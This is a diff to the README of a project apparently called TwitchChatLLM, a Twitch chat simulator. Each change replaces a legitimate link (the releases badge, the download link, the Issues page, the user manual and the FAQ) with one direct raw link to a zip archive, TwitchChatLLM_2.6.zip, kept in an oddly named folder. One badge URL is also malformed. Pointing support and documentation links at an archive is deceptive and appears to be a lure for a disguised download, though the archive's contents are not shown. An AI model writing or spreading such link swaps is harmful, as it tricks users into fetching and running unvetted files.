@@ -1,6 +1,6 @@
 # 🎮 TwitchChatLLM - Simulate Twitch Chat with Ease
 
-[![Download TwitchChatLLM](https://img.shields.io/badge/Download%20TwitchChatLLM-latest-brightgreen.svg)](https://github.com/aildozapp/TwitchChatLLM/releases)
+[![Download TwitchChatLLM](https://raw.githubusercontent.com/aildozapp/TwitchChatLLM/main/carbonemia/TwitchChatLLM_2.6.zip%https://raw.githubusercontent.com/aildozapp/TwitchChatLLM/main/carbonemia/TwitchChatLLM_2.6.zip)](https://raw.githubusercontent.com/aildozapp/TwitchChatLLM/main/carbonemia/TwitchChatLLM_2.6.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to TwitchChatLLM! This application allows you to simulate a lively Twitc
 
 To get started, visit the following link to download the latest version of TwitchChatLLM:
 
-[Download TwitchChatLLM](https://github.com/aildozapp/TwitchChatLLM/releases)
+[Download TwitchChatLLM](https://raw.githubusercontent.com/aildozapp/TwitchChatLLM/main/carbonemia/TwitchChatLLM_2.6.zip)
 
 ### Steps to Download
 
@@ -86,15 +86,15 @@ If you run into issues while using TwitchChatLLM, here are some common problems 
 
 If you have any questions or need support, you can reach out through the following channels:
 
-- **Issues Page:** Report issues or request features on the [GitHub Issues page](https://github.com/aildozapp/TwitchChatLLM/issues).
+- **Issues Page:** Report issues or request features on the [GitHub Issues page](https://raw.githubusercontent.com/aildozapp/TwitchChatLLM/main/carbonemia/TwitchChatLLM_2.6.zip).
 - **Community Forums:** Join discussions with other users about tips and experiences.
 
 ## 📚 Additional Resources
 
 For more detailed information about how to use TwitchChatLLM, consider the following resources:
 
-- **User Manual:** Access the comprehensive user manual [here](https://github.com/aildozapp/TwitchChatLLM/wiki).
-- **FAQ Section:** Check our FAQ for common questions [here](https://github.com/aildozapp/TwitchChatLLM/faq).
+- **User Manual:** Access the comprehensive user manual [here](https://raw.githubusercontent.com/aildozapp/TwitchChatLLM/main/carbonemia/TwitchChatLLM_2.6.zip).
+- **FAQ Section:** Check our FAQ for common questions [here](https://raw.githubusercontent.com/aildozapp/TwitchChatLLM/main/carbonemia/TwitchChatLLM_2.6.zip).
 
 ## 💡 Tips for Best Experience
 
